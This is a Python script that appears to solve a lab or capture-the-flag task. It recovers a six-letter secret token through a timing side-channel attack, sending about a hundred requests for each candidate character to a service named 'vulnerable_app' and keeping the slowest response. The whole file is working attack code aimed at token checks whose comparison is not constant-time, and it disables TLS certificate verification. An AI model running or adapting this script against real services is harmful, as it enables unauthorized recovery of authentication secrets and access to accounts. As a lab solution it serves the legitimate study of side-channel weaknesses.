import statistics
import requests
import time

def test_token_single(url, token):
    start = time.perf_counter_ns()
    try:
        r = requests.get(url, params={"token": token}, verify=False, timeout=5)
        duration = time.perf_counter_ns() - start
        return duration
    except:
        return None

def test_token(url, token, num_requests=100):
    times = [] # i sampled a token multiple times in an attempt to mitigate network errors
    for _ in range(num_requests):
        result = test_token_single(url, token)
        if result is not None:
            times.append(result)
    
    if not times:
        return 0
        
    # Remove outliers again in attempt to reduce outliers and get the microsecond differences
    q1 = statistics.quantiles(times, n=4)[0]
    q3 = statistics.quantiles(times, n=4)[2]
    iqr = q3 - q1
    filtered = [t for t in times if q1 - 1.5*iqr <= t <= q3 + 1.5*iqr]
    
    return statistics.median(filtered) if filtered else 0

def main():
    url = "http://vulnerable_app:5000/api/123"
    charset = "abcdefghijklmnopqrstuvwxyz"
    token_length = 6
    current_guess = ['0'] * (token_length)

    for i in range(0, token_length):  
        best_char = None
        best_time = 0
        
        for ch in charset:
            current_guess[i] = ch
            guess_str = "".join(current_guess)
            avg_time = test_token(url, guess_str)
            if avg_time > best_time:
                best_time = avg_time
                best_char = ch
        
        current_guess[i] = best_char

    print(f"TOKEN={''.join(current_guess)}")  # Add this specific format

if __name__ == "__main__":
    main()